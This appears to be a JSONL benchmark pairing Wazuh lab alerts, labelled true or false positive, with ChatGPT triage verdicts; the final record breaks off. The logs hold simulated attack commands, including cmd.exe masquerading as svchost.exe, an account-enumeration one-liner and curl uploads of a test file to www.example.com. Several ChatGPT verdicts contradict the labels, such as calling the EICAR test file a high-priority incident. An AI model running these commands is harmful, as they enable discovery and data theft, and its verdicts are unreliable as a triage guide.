{"id": "kpidt5cBXAXXEEORRTZp", "description": "VirusTotal: Alert - c:\\users\\snell\\downloads\\eicar-test.txt - 63 engines detected this file", "label": "FP", "rule_level": 12, "rule_priority": "High", "alert": {"_index": "wazuh-alerts-4.x-2025.06.28", "_id": "kpidt5cBXAXXEEORRTZp", "_version": 1, "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"integration": "virustotal", "virustotal": {"sha1": "3395856ce81f2b7382dee72602f798b642f14140", "malicious": "1", "total": "69", "found": "1", "positives": "63", "source": {"sha1": "3395856ce81f2b7382dee72602f798b642f14140", "file": "c:\\users\\snell\\downloads\\eicar-test.txt", "alert_id": "1751132222.10736173", "md5": "44d88612fea8a8f36de82e1278abb02f"}, "permalink": "https://www.virustotal.com/gui/file/275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f/detection/f-275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f-1751131807", "scan_date": "2025-06-28 17:30:07"}}, "rule": {"firedtimes": 1, "mail": true, "pci_dss": ["10.6.1", "11.4"], "description": "VirusTotal: Alert - c:\\users\\snell\\downloads\\eicar-test.txt - 63 engines detected this file", "groups": ["virustotal"], "mitre": {"technique": ["Exploitation for Client Execution"], "id": ["T1203"], "tactic": ["Execution"]}, "id": "87105", "gdpr": ["IV_35.7.d"]}, "location": "virustotal", "decoder": {"name": "json"}, "id": "1751132225.10746856", "timestamp": "2025-06-28T17:37:05.488+0000"}, "fields": {"timestamp": ["2025-06-28T17:37:05.488Z"]}, "sort": [1751132225488]}, "chatgpt_response": {"alert_id": "1751132222.10736173", "classification": "TP", "priority": "High", "justification": "The alert is triggered by VirusTotal reporting that 63 out of 69 antivirus engines flagged the file 'eicar-test.txt' as malicious. This is a well-known test file intentionally used to test antivirus responses, but in a real-world scenario, such a detection indicates a potentially malicious file execution attempt on the endpoint. The rule is mapped to PCI DSS and GDPR requirements, and the MITRE ATT&CK framework classifies the technique as 'Exploitation for Client Execution' (T1203), which is significant. Therefore, this should be treated as a True Positive with High priority for immediate investigation and remediation."}, "chatgpt_classification": "TP", "chatgpt_priority": "High", "chatgpt_justification": "The alert is triggered by VirusTotal reporting that 63 out of 69 antivirus engines flagged the file 'eicar-test.txt' as malicious. This is a well-known test file intentionally used to test antivirus responses, but in a real-world scenario, such a detection indicates a potentially malicious file execution attempt on the endpoint. The rule is mapped to PCI DSS and GDPR requirements, and the MITRE ATT&CK framework classifies the technique as 'Exploitation for Client Execution' (T1203), which is significant. Therefore, this should be treated as a True Positive with High priority for immediate investigation and remediation.", "classification_match": false, "priority_match": true}
{"id": "a0f8z5cBxOat6TbbfWeO", "description": "Special privileges assigned to new logon.", "label": "FP", "rule_level": 3, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.03", "_id": "a0f8z5cBxOat6TbbfWeO", "_version": 1, "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.12", "name": "WinSrv2019", "id": "004"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"subjectLogonId": "0x3fa5cb", "subjectUserSid": "S-1-5-21-3023907177-3273552708-540821291-1002", "subjectDomainName": "SOCLAB", "privilegeList": "SeAuditPrivilege     SeAssignPrimaryTokenPrivilege     SeImpersonatePrivilege", "subjectUserName": "WINSRV2019$"}, "system": {"eventID": "4672", "keywords": "0x8020000000000000", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "level": "0", "channel": "Security", "opcode": "0", "message": "\"Special privileges assigned to new logon.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-5-21-3023907177-3273552708-540821291-1002\r\n\tAccount Name:\t\tWINSRV2019$\r\n\tAccount Domain:\t\tSOCLAB\r\n\tLogon ID:\t\t0x3FA5CB\r\n\r\nPrivileges:\t\tSeAuditPrivilege\r\n\t\t\tSeAssignPrimaryTokenPrivilege\r\n\t\t\tSeImpersonatePrivilege\"", "version": "0", "systemTime": "2025-07-03T11:11:58.404730400Z", "eventRecordID": "23613", "threadID": "1384", "computer": "WinSrv2019.soclab.internal", "task": "12548", "processID": "636", "severityValue": "AUDIT_SUCCESS", "providerName": "Microsoft-Windows-Security-Auditing"}}}, "rule": {"firedtimes": 1, "mail": false, "description": "Special privileges assigned to new logon.", "groups": ["windows", " WEF"], "mitre": {"technique": ["Domain Policy Modification"], "id": ["T1484"], "tactic": ["Defense Evasion", "Privilege Escalation"]}, "id": "67028"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751541112.14338151", "timestamp": "2025-07-03T11:11:52.171+0000"}, "fields": {"timestamp": ["2025-07-03T11:11:52.171Z"]}, "sort": [1751541112171]}, "chatgpt_response": {"alert_id": "a0f8z5cBxOat6TbbfWeO", "classification": "TP", "priority": "High", "justification": "The alert indicates that special privileges were assigned to a new logon (event ID 4672, SeAuditPrivilege, SeAssignPrimaryTokenPrivilege, SeImpersonatePrivilege) on a Windows server. This is a common indicator of privilege escalation or domain policy modification (T1484), which are serious security events. The presence of privileged rights being assigned should be investigated immediately."}, "chatgpt_classification": "TP", "chatgpt_priority": "High", "chatgpt_justification": "The alert indicates that special privileges were assigned to a new logon (event ID 4672, SeAuditPrivilege, SeAssignPrimaryTokenPrivilege, SeImpersonatePrivilege) on a Windows server. This is a common indicator of privilege escalation or domain policy modification (T1484), which are serious security events. The presence of privileged rights being assigned should be investigated immediately.", "classification_match": false, "priority_match": false}
{"id": "Cwr_35cBiGYaRV9XyLPp", "description": "Possible abuse of Windows admin shares by binary dropped in Windows root folder by system process", "label": "TP", "rule_level": 6, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.06", "_id": "Cwr_35cBiGYaRV9XyLPp", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"image": "System", "processGuid": "{ff3427f9-51d0-686a-eb03-000000000000}", "processId": "4", "utcTime": "2025-07-06 13:49:18.827", "targetFilename": "C:\\\\Windows\\\\PSEXESVC.exe", "creationUtcTime": "2025-07-04 20:41:00.770", "user": "NT AUTHORITY\\\\SYSTEM"}, "system": {"eventID": "11", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"File created:\r\nRuleName: -\r\nUtcTime: 2025-07-06 13:49:18.827\r\nProcessGuid: {ff3427f9-51d0-686a-eb03-000000000000}\r\nProcessId: 4\r\nImage: System\r\nTargetFilename: C:\\Windows\\PSEXESVC.exe\r\nCreationUtcTime: 2025-07-04 20:41:00.770\r\nUser: NT AUTHORITY\\SYSTEM\"", "version": "2", "systemTime": "2025-07-06T13:49:18.8285706Z", "eventRecordID": "875684", "threadID": "3716", "computer": "Win11Client.soclab.internal", "task": "11", "processID": "3024", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 1, "mail": false, "description": "Possible abuse of Windows admin shares by binary dropped in Windows root folder by system process", "groups": ["sysmon", "sysmon_eid11_detections", "windows"], "mitre": {"technique": ["Lateral Tool Transfer"], "id": ["T1570"], "tactic": ["Lateral Movement"]}, "id": "92218"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751809769.25754605", "timestamp": "2025-07-06T13:49:29.405+0000"}, "fields": {"timestamp": ["2025-07-06T13:49:29.405Z"]}, "sort": [1751809769405]}, "chatgpt_response": {"alert_id": "Cwr_35cBiGYaRV9XyLPp", "classification": "TP", "priority": "High", "justification": "The alert indicates that a file named 'PSEXESVC.exe' was created in the Windows root directory by the SYSTEM user via the process 'System'. This is flagged by Sysmon (event ID 11) and matches a detection rule for possible abuse of Windows admin shares and lateral movement (MITRE T1570). The presence of a suspicious executable in a protected directory, created by a system process, is a strong indicator of potential compromise or lateral movement. This should be treated as a high-priority alert requiring immediate investigation."}, "chatgpt_classification": "TP", "chatgpt_priority": "High", "chatgpt_justification": "The alert indicates that a file named 'PSEXESVC.exe' was created in the Windows root directory by the SYSTEM user via the process 'System'. This is flagged by Sysmon (event ID 11) and matches a detection rule for possible abuse of Windows admin shares and lateral movement (MITRE T1570). The presence of a suspicious executable in a protected directory, created by a system process, is a strong indicator of potential compromise or lateral movement. This should be treated as a high-priority alert requiring immediate investigation.", "classification_match": true, "priority_match": false}
{"id": "yJyD5pcBllEhiOW6yWa1", "description": "Suricata: Alert - ET INFO Possible Kali Linux hostname in DHCP Request Packet", "label": "TP", "rule_level": 3, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.07", "_id": "yJyD5pcBllEhiOW6yWa1", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.6", "name": "Suricata", "id": "001"}, "manager": {"name": "wazuh-server"}, "data": {"app_proto": "dhcp", "in_iface": "enp0s3", "src_ip": "10.0.2.8", "src_port": "68", "event_type": "alert", "alert": {"severity": "1", "signature_id": "2022973", "rev": "1", "metadata": {"performance_impact": ["Low"], "attack_target": ["Client_Endpoint"], "updated_at": ["2019_07_26"], "confidence": ["Medium"], "reviewed_at": ["2024_04_19"], "created_at": ["2016_07_18"], "signature_severity": ["Informational"], "deployment": ["Perimeter"]}, "gid": "1", "signature": "ET INFO Possible Kali Linux hostname in DHCP Request Packet", "action": "allowed", "category": "Potential Corporate Privacy Violation"}, "flow_id": "1730958389108054.000000", "dest_ip": "10.0.2.3", "proto": "UDP", "dest_port": "67", "pkt_src": "wire/pcap", "flow": {"src_ip": "10.0.2.8", "src_port": "68", "pkts_toserver": "2", "dest_ip": "10.0.2.3", "start": "2025-07-07T20:06:22.992844+0000", "bytes_toclient": "590", "bytes_toserver": "648", "pkts_toclient": "1", "dest_port": "67"}, "timestamp": "2025-07-07T20:11:22.838518+0000", "direction": "to_server"}, "rule": {"firedtimes": 7, "mail": false, "description": "Suricata: Alert - ET INFO Possible Kali Linux hostname in DHCP Request Packet", "groups": ["ids", "suricata"], "id": "86601"}, "location": "/var/log/suricata/eve.json", "decoder": {"name": "json"}, "id": "1751919082.4571264", "timestamp": "2025-07-07T20:11:22.921+0000"}, "fields": {"timestamp": ["2025-07-07T20:11:22.921Z"], "data.timestamp": ["2025-07-07T20:11:22.838Z"]}, "sort": [1751919082921]}, "chatgpt_response": {"alert_id": "yJyD5pcBllEhiOW6yWa1", "classification": "FP", "priority": "Low", "justification": "The alert triggered by Suricata for 'Possible Kali Linux hostname in DHCP Request Packet' is informational in nature, with a low performance impact and a medium confidence rating. Kali Linux is a penetration testing distribution, but a DHCP request alone does not indicate malicious intent unless corroborated by other suspicious activity. Since the alert is informational and not confirmed as an actual attack or privacy violation, it is classified as a False Positive (FP). Given the informational severity and low impact, the priority is set to Low."}, "chatgpt_classification": "FP", "chatgpt_priority": "Low", "chatgpt_justification": "The alert triggered by Suricata for 'Possible Kali Linux hostname in DHCP Request Packet' is informational in nature, with a low performance impact and a medium confidence rating. Kali Linux is a penetration testing distribution, but a DHCP request alone does not indicate malicious intent unless corroborated by other suspicious activity. Since the alert is informational and not confirmed as an actual attack or privacy violation, it is classified as a False Positive (FP). Given the informational severity and low impact, the priority is set to Low.", "classification_match": false, "priority_match": true}
{"id": "3hdp15cB1Hp-jZ7fMbKv", "description": "Sysmon - Suspicious Process - svchost.exe", "label": "TP", "rule_level": 12, "rule_priority": "High", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "3hdp15cB1Hp-jZ7fMbKv", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "Cmd.Exe", "image": "C:\\\\svchost.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-4be9-6868-f605-000000001400}", "description": "Windows Command Processor", "logonGuid": "{ff3427f9-1e7f-6868-f045-0a0000000000}", "parentCommandLine": "\\\"cmd.exe\\\" /c copy C:\\\\Windows\\\\System32\\\\cmd.exe C:\\\\svchost.exe &amp; C:\\\\svchost.exe /c echo T1105 &gt; \\\\\\\\localhost\\\\c$\\\\T1105.txt", "processGuid": "{ff3427f9-4bea-6868-f805-000000001400}", "logonId": "0xa45f0", "parentProcessId": "9852", "processId": "2224", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-04 21:47:22.063", "hashes": "SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6", "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "C:\\\\svchost.exe  /c echo T1105", "integrityLevel": "High", "fileVersion": "10.0.26100.4202 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-04 21:47:22.063\r\nProcessGuid: {ff3427f9-4bea-6868-f805-000000001400}\r\nProcessId: 2224\r\nImage: C:\\svchost.exe\r\nFileVersion: 10.0.26100.4202 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: C:\\svchost.exe  /c echo T1105 \r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}\r\nLogonId: 0xA45F0\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6\r\nParentProcessGuid: {ff3427f9-4be9-6868-f605-000000001400}\r\nParentProcessId: 9852\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"cmd.exe\" /c copy C:\\Windows\\System32\\cmd.exe C:\\svchost.exe & C:\\svchost.exe /c echo T1105 > \\\\localhost\\c$\\T1105.txt\r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-04T21:47:22.0716524Z", "eventRecordID": "391447", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 1, "mail": true, "pci_dss": ["10.6.1", "11.4"], "hipaa": ["164.312.b"], "tsc": ["CC7.2", "CC7.3", "CC6.1", "CC6.8"], "description": "Sysmon - Suspicious Process - svchost.exe", "groups": ["windows", "sysmon", "sysmon_process-anomalies"], "mitre": {"technique": ["Process Injection"], "id": ["T1055"], "tactic": ["Defense Evasion", "Privilege Escalation"]}, "id": "61618", "nist_800_53": ["AU.6", "SI.4"], "gdpr": ["IV_35.7.d"]}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751665676.64008238", "full_log": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2025-07-04T21:47:22.0716524Z\",\"eventRecordID\":\"391447\",\"processID\":\"3056\",\"threadID\":\"3992\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"Win11Client.soclab.internal\",\"severityValue\":\"INFORMATION\",\"message\":\"\\\"Process Create:\\r\\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\\r\\nUtcTime: 2025-07-04 21:47:22.063\\r\\nProcessGuid: {ff3427f9-4bea-6868-f805-000000001400}\\r\\nProcessId: 2224\\r\\nImage: C:\\\\svchost.exe\\r\\nFileVersion: 10.0.26100.4202 (WinBuild.160101.0800)\\r\\nDescription: Windows Command Processor\\r\\nProduct: Microsoft\u00ae Windows\u00ae Operating System\\r\\nCompany: Microsoft Corporation\\r\\nOriginalFileName: Cmd.Exe\\r\\nCommandLine: C:\\\\svchost.exe  /c echo T1105 \\r\\nCurrentDirectory: C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\\\r\\nUser: SOCLAB\\\\snell\\r\\nLogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}\\r\\nLogonId: 0xA45F0\\r\\nTerminalSessionId: 1\\r\\nIntegrityLevel: High\\r\\nHashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6\\r\\nParentProcessGuid: {ff3427f9-4be9-6868-f605-000000001400}\\r\\nParentProcessId: 9852\\r\\nParentImage: C:\\\\Windows\\\\System32\\\\cmd.exe\\r\\nParentCommandLine: \\\"cmd.exe\\\" /c copy C:\\\\Windows\\\\System32\\\\cmd.exe C:\\\\svchost.exe & C:\\\\svchost.exe /c echo T1105 > \\\\\\\\localhost\\\\c$\\\\T1105.txt\\r\\nParentUser: SOCLAB\\\\snell\\\"\"},\"eventdata\":{\"ruleName\":\"technique_id=T1059,technique_name=Command-Line Interface\",\"utcTime\":\"2025-07-04 21:47:22.063\",\"processGuid\":\"{ff3427f9-4bea-6868-f805-000000001400}\",\"processId\":\"2224\",\"image\":\"C:\\\\\\\\svchost.exe\",\"fileVersion\":\"10.0.26100.4202 (WinBuild.160101.0800)\",\"description\":\"Windows Command Processor\",\"product\":\"Microsoft\u00ae Windows\u00ae Operating System\",\"company\":\"Microsoft Corporation\",\"originalFileName\":\"Cmd.Exe\",\"commandLine\":\"C:\\\\\\\\svchost.exe  /c echo T1105\",\"currentDirectory\":\"C:\\\\\\\\Users\\\\\\\\snell\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Temp\\\\\\\\\",\"user\":\"SOCLAB\\\\\\\\snell\",\"logonGuid\":\"{ff3427f9-1e7f-6868-f045-0a0000000000}\",\"logonId\":\"0xa45f0\",\"terminalSessionId\":\"1\",\"integrityLevel\":\"High\",\"hashes\":\"SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6\",\"parentProcessGuid\":\"{ff3427f9-4be9-6868-f605-000000001400}\",\"parentProcessId\":\"9852\",\"parentImage\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\cmd.exe\",\"parentCommandLine\":\"\\\\\\\"cmd.exe\\\\\\\" /c copy C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\cmd.exe C:\\\\\\\\svchost.exe &amp; C:\\\\\\\\svchost.exe /c echo T1105 &gt; \\\\\\\\\\\\\\\\localhost\\\\\\\\c$\\\\\\\\T1105.txt\",\"parentUser\":\"SOCLAB\\\\\\\\snell\"}}}", "timestamp": "2025-07-04T21:47:56.165+0000"}, "fields": {"timestamp": ["2025-07-04T21:47:56.165Z"]}, "sort": [1751665676165]}, "chatgpt_response": {"alert_id": "3hdp15cB1Hp-jZ7fMbKv", "classification": "TP", "priority": "Critical", "justification": "The alert indicates the execution of a suspicious command involving process masquerading and command execution, specifically leveraging 'svchost.exe' to run a command associated with MITRE ATT&CK T1105 (Remote File Copy) and T1055 (Process Injection). The process was spawned from a command line that attempts to copy 'cmd.exe' to 'svchost.exe' and then runs an echo command to a network share, which is a classic technique for lateral movement and persistence. This is a clear security incident and not a false positive."}, "chatgpt_classification": "TP", "chatgpt_priority": "Critical", "chatgpt_justification": "The alert indicates the execution of a suspicious command involving process masquerading and command execution, specifically leveraging 'svchost.exe' to run a command associated with MITRE ATT&CK T1105 (Remote File Copy) and T1055 (Process Injection). The process was spawned from a command line that attempts to copy 'cmd.exe' to 'svchost.exe' and then runs an echo command to a network share, which is a classic technique for lateral movement and persistence. This is a clear security incident and not a false positive.", "classification_match": true, "priority_match": false}
{"id": "w6mu2pcBGfDWR0X_074N", "description": "Suspicious Windows cmd shell execution", "label": "TP", "rule_level": 3, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.05", "_id": "w6mu2pcBGfDWR0X_074N", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "FIND.EXE", "image": "C:\\\\Windows\\\\System32\\\\find.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-226b-6869-8f01-000000001500}", "description": "Find String (grep) Utility", "logonGuid": "{ff3427f9-2071-6869-6f2f-080000000000}", "parentCommandLine": "\\\"cmd.exe\\\" /c cmd.exe /C whoami &amp; wmic useraccount get /ALL &amp; quser /SERVER:\\\"localhost\\\" &amp; quser &amp; qwinsta.exe /server:localhost &amp; qwinsta.exe &amp; for /F \\\"tokens=1,2\\\" %i in ('qwinsta /server:localhost ^| findstr \\\"Active Disc\\\"') do @echo %i | find /v \\\"#\\\" | find /v \\\"console\\\" || echo %j &gt; computers.txt &amp; @FOR /F %n in (computers.txt) DO @FOR /F \\\"tokens=1,2\\\" %i in ('qwinsta /server:%n ^| findstr \\\"Active Disc\\\"') do @echo %i | find /v \\\"#\\\" | find /v \\\"console\\\" || echo %j &gt; usernames.txt", "processGuid": "{ff3427f9-2281-6869-9d01-000000001500}", "logonId": "0x82f6f", "parentProcessId": "9176", "processId": "1788", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-05 13:02:57.757", "hashes": "SHA1=92ADFE3440739BFB92E9866D2ED050E5D20BE198,MD5=21AF9D1389428FB7DE154C11ADCAC954,SHA256=CF9CC5A552DE280750B36743E80C33381E59D5EC8AA65A2DCFDD6A34198799BC,IMPHASH=7EF15CE1238ABC9D0468CB4D7C10B6F3", "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "find  /v \\\"console\\\"", "integrityLevel": "High", "fileVersion": "10.0.26100.1 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-05 13:02:57.757\r\nProcessGuid: {ff3427f9-2281-6869-9d01-000000001500}\r\nProcessId: 1788\r\nImage: C:\\Windows\\System32\\find.exe\r\nFileVersion: 10.0.26100.1 (WinBuild.160101.0800)\r\nDescription: Find String (grep) Utility\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: FIND.EXE\r\nCommandLine: find  /v \"console\" \r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-2071-6869-6f2f-080000000000}\r\nLogonId: 0x82F6F\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=92ADFE3440739BFB92E9866D2ED050E5D20BE198,MD5=21AF9D1389428FB7DE154C11ADCAC954,SHA256=CF9CC5A552DE280750B36743E80C33381E59D5EC8AA65A2DCFDD6A34198799BC,IMPHASH=7EF15CE1238ABC9D0468CB4D7C10B6F3\r\nParentProcessGuid: {ff3427f9-226b-6869-8f01-000000001500}\r\nParentProcessId: 9176\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"cmd.exe\" /c cmd.exe /C whoami & wmic useraccount get /ALL & quser /SERVER:\"localhost\" & quser & qwinsta.exe /server:localhost & qwinsta.exe & for /F \"tokens=1,2\" %i in ('qwinsta /server:localhost ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > computers.txt & @FOR /F %n in (computers.txt) DO @FOR /F \"tokens=1,2\" %i in ('qwinsta /server:%n ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > usernames.txt\r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-05T13:02:57.7618193Z", "eventRecordID": "395407", "threadID": "3628", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3068", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 13, "mail": false, "description": "Suspicious Windows cmd shell execution", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Account Discovery", "Windows Command Shell"], "id": ["T1087", "T1059.003"], "tactic": ["Discovery", "Execution"]}, "id": "92032"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751720578.2137945", "timestamp": "2025-07-05T13:02:58.727+0000"}, "fields": {"timestamp": ["2025-07-05T13:02:58.727Z"]}, "sort": [1751720578727]}, "chatgpt_response": {"alert_id": "w6mu2pcBGfDWR0X_074N", "classification": "TP", "priority": "High", "justification": "This alert was generated by Sysmon for process creation of 'find.exe' (a command-line utility) with a suspicious command line argument ('find /v \"console\"'), matching rules for technique_id=T1059 (Command-Line Interface) and T1087 (Account Discovery). The activity includes enumeration commands (whoami, wmic useraccount get /ALL, quser, qwinsta.exe), which are typical of lateral movement and credential discovery. The process is running with High integrity level and originates from a user context. This activity is highly suspicious and warrants immediate investigation."}, "chatgpt_classification": "TP", "chatgpt_priority": "High", "chatgpt_justification": "This alert was generated by Sysmon for process creation of 'find.exe' (a command-line utility) with a suspicious command line argument ('find /v \"console\"'), matching rules for technique_id=T1059 (Command-Line Interface) and T1087 (Account Discovery). The activity includes enumeration commands (whoami, wmic useraccount get /ALL, quser, qwinsta.exe), which are typical of lateral movement and credential discovery. The process is running with High integrity level and originates from a user context. This activity is highly suspicious and warrants immediate investigation.", "classification_match": true, "priority_match": false}
{"id": "9Rdp15cB1Hp-jZ7fRbI5", "description": "Suspicious Windows cmd shell execution", "label": "TP", "rule_level": 3, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "9Rdp15cB1Hp-jZ7fRbI5", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "curl.exe", "image": "C:\\\\Windows\\\\System32\\\\curl.exe", "product": "The curl executable", "parentProcessGuid": "{ff3427f9-4bfa-6868-0e06-000000001400}", "description": "The curl executable", "logonGuid": "{ff3427f9-1e7f-6868-f045-0a0000000000}", "parentCommandLine": "\\\"cmd.exe\\\" /c C:\\\\Windows\\\\System32\\\\Curl.exe -T c:\\\\temp\\\\atomictestfile.txt www.example.com &amp; C:\\\\Windows\\\\System32\\\\Curl.exe --upload-file c:\\\\temp\\\\atomictestfile.txt www.example.com &amp; C:\\\\Windows\\\\System32\\\\Curl.exe -d c:\\\\temp\\\\atomictestfile.txt www.example.com &amp; C:\\\\Windows\\\\System32\\\\Curl.exe --data c:\\\\temp\\\\atomictestfile.txt www.example.com", "processGuid": "{ff3427f9-4bfb-6868-1306-000000001400}", "logonId": "0xa45f0", "parentProcessId": "9660", "processId": "3380", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-04 21:47:39.261", "hashes": "SHA1=A1BD7848E36F22021C68F4F24EDFDB7ACE42FCA3,MD5=90939B67542D77A32042B7C1945623B1,SHA256=3345339164CF384EFF527B6C3160FEA8D849A4231EC6CA80513E3A739E505168,IMPHASH=6C25E5A258C8C037CD5FBE44B10E696F", "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "curl, https://curl.se/", "commandLine": "C:\\\\Windows\\\\System32\\\\Curl.exe  --data c:\\\\temp\\\\atomictestfile.txt www.example.com", "integrityLevel": "High", "fileVersion": "8.13.0", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process 